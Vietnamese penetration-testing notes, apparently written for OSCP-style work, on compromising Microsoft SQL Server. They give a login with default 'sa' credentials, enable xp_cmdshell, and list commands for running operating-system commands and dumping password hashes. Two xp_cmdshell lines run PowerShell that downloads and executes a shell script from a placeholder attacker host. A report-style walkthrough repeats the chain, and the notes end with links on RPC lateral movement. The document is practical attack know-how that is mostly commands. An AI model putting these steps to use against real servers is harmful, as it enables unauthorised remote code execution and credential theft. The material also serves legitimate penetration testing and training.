**1. MSSQL**
- https://github.com/MalekAlthubiany/impacket-mssqlclient-OSCP
- https://www.offensivecyberprofessional.com/mssqlclient-py/
- https://exploit-notes.hdks.org/exploit/database/mssql/
- https://red.infiltr8.io/network-pentesting/protocols/mssql#post-exploit
- https://pentesting.site/exploitation-of-ports-and-services/port-1433-mssql/
- https://github.com/ivanversluis/pentest-hacktricks/blob/master/pentesting/pentesting-mssql-microsoft-sql-server.md
- https://www.hackingarticles.in/mssql-for-pentester-metasploit/
- http://michalszalkowski.com/security/pentesting-ports/1433-mssql/
- Login: `impacket-mssqlclient 192.168.1.109:1433 -U sa -P 'P@ssw0rd123'`
- Sau khi login:
```
-- Kiểm tra có quyền sysadmin không 
SELECT IS_SRVROLEMEMBER('sysadmin');

-- List tất cả database
SELECT name FROM sys.databases;

-- Chuyển sang database muốn dùng
USE master;  -- hoặc msdb, hoặc database nào bạn thấy

-- Kiểm tra xp_cmdshell đã bật chưa
SELECT value FROM sys.configurations WHERE name = 'xp_cmdshell';

-- Nếu chưa bật và có quyền sysadmin → bật nó lên
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

-- Chạy lệnh Windows (reverse shell ví dụ)
EXEC xp_cmdshell 'powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString(''http://your-ip:8000/shell.ps1'')"';
```
- xp_cmdshell có sẵn trong Microsoft SQL Server, cho phép thực thi lệnh hệ điều hành Windows (command shell) trực tiếp từ trong SQL Server.
- Chức năng: Chạy bất kỳ lệnh nào mà cmd.exe có thể chạy
- Ví dụ:
```
EXEC xp_cmdshell 'whoami'
EXEC xp_cmdshell 'dir c:\'
EXEC xp_cmdshell 'powershell -c "IEX(New-Object Net.WebClient).DownloadString(''http://attacker/shell.ps1'')"'
```

Report:
- Microsoft SQL Server (MS-SQL) là một hệ quản trị cơ sở dữ liệu do Microsoft phát triển, thường được triển khai trong các môi trường doanh nghiệp để lưu trữ, xử lý và quản lý dữ liệu cho ứng dụng nội bộ hoặc hệ thống web. Dịch vụ MS-SQL mặc định lắng nghe trên port 1433, cho phép user kết nối vào server để thực hiện các truy vấn SQL khi có valid credential.
- Khi đăng nhập thành công, attacker có thể thực hiện các query để enumeration database, table, user và vai trò của current user. Nếu account thuộc nhóm sysadmin, MS-SQL còn cho phép kích hoạt tính năng xp_cmdshell.
- xp_cmdshell có sẵn trong Microsoft SQL Server, cho phép thực thi lệnh hệ điều hành Windows (command shell) trực tiếp từ trong SQL Server => cho phép remote code execution. Từ đó attacker có thể upload payload và tạo reverse connection về máy attacker.
1. Để login vào SQL server, ta sử dụng công cụ impacket-mssqlclient (qua proxychains) với lệnh: proxychains impacket-mssqlclient 192.168.1.109:1433 -U sa -P 'sa'. 
2. Sau khi login thành công, attacker sẽ có một sessions để tương tác với SQL server. Lúc này ta có thể thực hiện các câu query để liệt kê database, user, role như:
- Kiểm tra quyền hiện tại và version của database:
SELECT @@version; --Version SQL Server
SELECT SYSTEM_USER; --Current user
SELECT IS_SRVROLEMEMBER('sysadmin'); -- 1 nếu là sysadmin

- Liệt kê tất cả các database với lệnh: SELECT name FROM sys.databases;
Trong MS-SQL, master là database hệ thống quan trọng nhất vì nó chứa toàn bộ metadata và configuration của toàn bộ SQL server.

- Chọn và sử dụng master database với lệnh: USER master;

- Dump password hash của tất cả SQL accounts với lệnh: SELECT name, password_hash FROM master.sys.sql_logins;

- Thông tin cấu hình toàn server: SELECT * FROM master.sys.databases;

- Thông tin về linked servers: SELECT * FROM master.sys.linked_logins; Linked servers trên MS-SQL là một tính năng cho phép SQL server instance này kết nối và query trực tiếp đến các data source khác mà không cần login (SQL server, Oracle, Excel...).

3. Sau khi xác nhận quyền sysadmin, attacker tận dụng tính năng xp_cmdshell để thực thi lệnh ở mức hệ điều hành thông qua SQL server với các lệnh:
-- Kiểm tra xp_cmdshell đã bật chưa
SELECT value FROM sys.configurations WHERE name = 'xp_cmdshell';
-- Nếu chưa bật và có quyền sysadmin → bật nó lên
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;'
-- Thực thi command
EXEC xp_cmdshell 'whoami'

**2. RPC**
- https://medium.com/@omaymaW/lateral-movement-in-active-directory-windows-and-linux-tools-part-1-e926daddafc9
- https://undercodetesting.com/detecting-modern-lateral-movement-dcom-rpc-and-rdp-attack-vectors/
